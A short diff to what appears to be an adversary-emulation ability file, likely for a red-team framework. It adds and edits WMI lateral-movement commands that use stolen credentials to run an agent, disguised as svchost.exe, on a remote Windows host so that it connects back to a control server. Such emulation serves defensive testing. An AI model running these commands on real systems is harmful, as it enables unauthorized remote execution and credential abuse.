@@ -9,6 +9,9 @@
     name: Windows Management Instrumentation
   platforms:
     windows:
+      psh:
+        command: |
+          wmic /node:#{remote.host.ip} /user:#{host.user.name} /password:#{host.user.password} process call create "powershell.exe C:\Users\Public\svchost.exe -server #{server} -executor psh";
       cmd:
         command: |
-          wmic /node:#{remote.network.ip} /user:#{user.name}@#{network.domain} /password:#{user.password} process call create "cmd /c C:\sandcat.exe -server #{server} -executor cmd"
+          wmic /node:#{remote.host.ip} /user:#{host.user.name} /password:#{host.user.password} process call create "cmd.exe /c C:\Users\Public\svchost.exe -server #{server} -executor cmd";
